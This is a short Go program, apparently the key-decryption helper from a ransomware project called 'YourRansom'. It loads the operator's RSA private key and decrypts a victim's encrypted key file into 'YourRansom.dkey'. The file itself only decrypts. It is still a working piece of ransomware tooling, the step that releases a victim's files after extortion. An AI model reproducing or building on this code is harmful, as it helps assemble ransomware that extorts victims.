package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"flag"
	"fmt"
	"os"
)

func main() {
	yourKeyLocation := flag.String("k", "YourRansom.key", "Key file to decrypt")
	flag.Parse()
	priKeyFile, err := os.Open("YourRansom.private")
	yourKeyFile, err1 := os.Open(*yourKeyLocation)
	if err != nil || err1 != nil {
		fmt.Println("ERROR: CANNOT load key file!")
		os.Exit(233)
	}
	priKey, yourKey := make([]byte, 10240), make([]byte, 128)
	priKeyFile.Read(priKey)
	yourKeyFile.Read(yourKey)
	block, _ := pem.Decode(priKey)
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	dkey, _ := rsa.DecryptPKCS1v15(rand.Reader, priv, yourKey)
	dkeyFile, _ := os.Create("YourRansom.dkey")
	dkeyFile.WriteAt(dkey, 0)
	fmt.Println("Your key decrypted!")
}
